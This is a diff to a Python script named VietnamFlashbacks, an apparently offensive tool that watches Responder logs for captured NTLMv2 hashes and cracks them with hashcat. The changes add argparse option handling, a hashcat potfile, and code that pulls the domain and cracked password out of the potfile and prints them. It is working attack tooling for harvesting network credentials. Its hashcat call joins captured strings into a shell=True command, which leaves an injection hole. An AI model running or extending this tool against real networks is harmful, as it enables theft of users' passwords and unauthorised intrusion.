@@ -1,8 +1,9 @@
 #!/usr/bin/python3
 
+import argparse    # for getting those command line arguments
 import getopt   # for getting those command line arguments
 import os    # for os path stuff
-import platform    # for detectind whether it is Nix or Windows
+# import platform    # for detectind whether it is Nix or Windows
 import re    # for searching for hashes
 import subprocess    # for spawning hashcat process
 import sys    # for stopping gracefully
@@ -24,53 +25,41 @@ flashbacks = """
 print(colored(vietnam, "green", attrs=['bold']))
 print(colored(flashbacks, "green", attrs=['bold']))
 
-print(colored("Real-time NTLMv2 bruteforcer, VietnamFlashbacks 0.8.5alpha", "yellow", attrs=['bold']))
+print(colored("Real-time NTLMv2 bruteforcer, VietnamFlashbacks 0.9.0beta", "yellow", attrs=['bold']))
 print("Press Ctrl+C as soon as you pwnd what you wanted\n")
 
 print("Brought to you by Dmitry Kireev (@InfiniteSuns)\n")
 
-responderdir = None
-dictdir = None
-hashcatdir = None
+responderdir = None    # variable to hold path to responder
+dictdir = None    # variable to hold path to dictionary
+# hashcatdir = None
 
-#osname = platform.system()
+logfile = None    # variable to hold path to logfile
+potfile = None    # variable to hold path to potfile
 
-try:
-    opts, args = getopt.getopt(sys.argv[1:], "hr:d:c:", ["responderdir=", "dictdir=", "hashcatdir="])
-except getopt.GetoptError:
-    print('VietnamFlashbacks.py -r <responder dir> -d <dictionary file> -c <hashcat dir>')
-    sys.exit(2)
+# osname = platform.system()
 
-for o, a in opts:
-    if o in ("-h", "--help"):
-        print("\nVietnamFlashbacks.py -r <responder dir> -d <dictionary file> -c <hashcat dir>\n")
-        sys.exit()
-    elif o in ("-r", "--responder"):
-        print("[i] Responder path recieved as argument")
-        if os.path.exists(a):
-            print("[+] Responder path seems legit\n")
-            responderdir = a
-        else:
-            print("[-] Responder path seems not legit\n")
-            sys.exit()
-    elif o in ("-d", "--dictionary"):
-        print("[i] Dictionary path recieved as argument")
-        if os.path.exists(a):
-            print("[+] Dictionary path seems legit\n")
-            dictdir = a
-        else:
-            print("[-] Dictionary path seems not legit\n")
-            sys.exit()
-    elif o in ("-c", "--hashcat"):
-        print("[i] Hashcat path recieved as argument")
-        if os.path.exists(a):
-            print("[+] Hashcat path seems legit\n")
-            hashcatdir = a
-        else:
-            print("[-] Hashcat path seems not legit\n")
-            sys.exit()
+argparser = argparse.ArgumentParser()
+argparser.add_argument('-r', '--responder', help="i.e. /root/github/responder", required=True)
+argparser.add_argument('-d', '--dictionary', help="i.e. /usr/share/wordlists/rockyou.txt", required=True)
+args = argparser.parse_args()
+
+if args.responder:
+    print("[i] Responder path recieved as argument")
+    if os.path.exists(args.responder):
+        print("[+] Responder path seems legit\n")
+        responderdir = args.responder
     else:
-        assert False, "unhandled option"
+        print("[-] Responder path seems not legit\n")
+        sys.exit()
+if args.dictionary:
+    print("[i] Dictionary path recieved as argument")
+    if os.path.exists(args.dictionary):
+        print("[+] Dictionary path seems legit\n")
+        dictdir = args.dictionary
+    else:
+        print("[-] Dictionary path seems not legit\n")
+        sys.exit()
 
 print("[i] Checking current directory")
 try:
@@ -87,16 +76,38 @@ workingdir = str.strip(workingdir[0])
 print("[i] Directory detected as " + workingdir + "\n")
 
 logfile = workingdir + "/VietnamFlashbacks.log"
+potfile = workingdir + "/VietnamFlashbacks.potfile"
 
 print("[~] Checking if logfile exists")
 if os.path.exists(logfile):
     print("[i] Logfile already exists\n")
 else:
-    logfileptr = open(logfile, "w")
-    logfileptr.close()
-    print("[i] Logfile was created\n")
+    try:
+        logfileptr = open(logfile, "w")
+        logfileptr.close()
+        print("[i] Logfile was created\n")
+    except Exception:
+        print(colored("[!] Had hard time creating logfile and failed!",
+                      "red"))
+        traceback.print_exc(file=sys.stdout)
+        sys.exit(0)
 
-ntlmv2pattern = re.compile('(^.*::\w*:\w*:\w*:\w*)')    # regexp too look for in responder logs
+print("[~] Checking if potfile exists")
+if os.path.exists(potfile):
+    print("[i] Potfile already exists\n")
+else:
+    try:
+        potfileptr = open(potfile, "w")
+        potfileptr.close()
+        print("[i] Potfile was created\n")
+    except Exception:
+        print(colored("[!] Had hard time creating potfile and failed!",
+                      "red"))
+        traceback.print_exc(file=sys.stdout)
+        sys.exit(0)
+
+ntlmv2pattern = re.compile('(^.*::\w*:\w*:\w*:\w*)')    # regexp to look for in responder logs
+crackedntlmv2pattern = re.compile('(^.*::\w*:\w*:\w*:\w*:\w*)')    # regexp to look for in hashcat potfile
 
 try:
     while True:
@@ -105,6 +116,7 @@ try:
                 for i, line in enumerate(open(os.path.join(responderdir, file))):
                     for match in re.finditer(ntlmv2pattern, line):
                         username = match.groups()[0].split('::')[0]
+                        domain = match.groups()[0].split('::')[1].split(':')[0]
 
                         try:
                             logfilebuf = open(logfile, "r").read()
@@ -120,7 +132,8 @@ try:
                             print("[i] Passing to hashcat\n")
 
                             output = subprocess.Popen(
-                                "hashcat -m 5600 " + match.groups()[0] + " " + dictdir,
+                                "hashcat -m 5600 " + match.groups()[0] + " " + dictdir +
+                                " --potfile-path " + potfile,
                                 stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                 stderr=subprocess.PIPE, shell=True, universal_newlines=True)
                             results = output.stdout.readlines()
@@ -145,7 +158,22 @@ try:
                             for result in results:
                                 if "Recovered" in result:
                                     if "1/1" in result:
-                                        print(colored("[!] Password recovered for " + username + "\n",
+                                        try:
+                                            for j, potline in enumerate(open(potfile, "r")):
+                                                for potmatch in re.finditer(crackedntlmv2pattern, potline):
+                                                    potusername = potmatch.groups()[0].split('::')[0]
+                                                    potdomain = potmatch.groups()[0].split('::')[1].split(':')[0]
+
+                                                    if username.lower() == potusername.lower() \
+                                                            and domain.lower() == potdomain.lower():
+                                                        password = potmatch.groups()[0].split('::')[1].split(':')[4]
+                                        except Exception:
+                                            print(colored("[!] Had hard time reading potfile and failed!",
+                                                          "red"))
+                                            traceback.print_exc(file=sys.stdout)
+                                            sys.exit(0)
+
+                                        print(colored("[!] Password recovered for " + username + ": " + password + "\n",
                                                       "red", attrs=['bold']))
 
                             logfileptr = open(logfile, "a")
